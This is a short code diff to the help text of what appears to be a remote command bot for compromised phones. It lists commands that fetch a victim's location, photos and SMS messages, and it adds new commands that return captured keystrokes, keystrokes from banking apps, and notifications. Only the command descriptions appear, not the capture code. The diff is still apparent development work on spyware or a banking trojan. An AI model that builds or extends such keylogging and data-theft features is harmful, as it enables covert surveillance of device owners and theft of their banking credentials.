@@ -229,6 +229,9 @@ const HELP_TEXT = `
 /location &lt;id&gt; — Get current GPS location
 /gallery &lt;id&gt; — Last 3 gallery photos (count)
 /lastsms &lt;id&gt; — Last 5 SMS messages
+/keylog &lt;id&gt; — Last 20 keystrokes captured
+/banking &lt;id&gt; — Last 20 keystrokes from banking apps
+/notifications &lt;id&gt; — Last 20 notification captures
 /kill &lt;id&gt; — Kill switch (disable app)
 /unkill &lt;id&gt; — Re-enable killed device
 
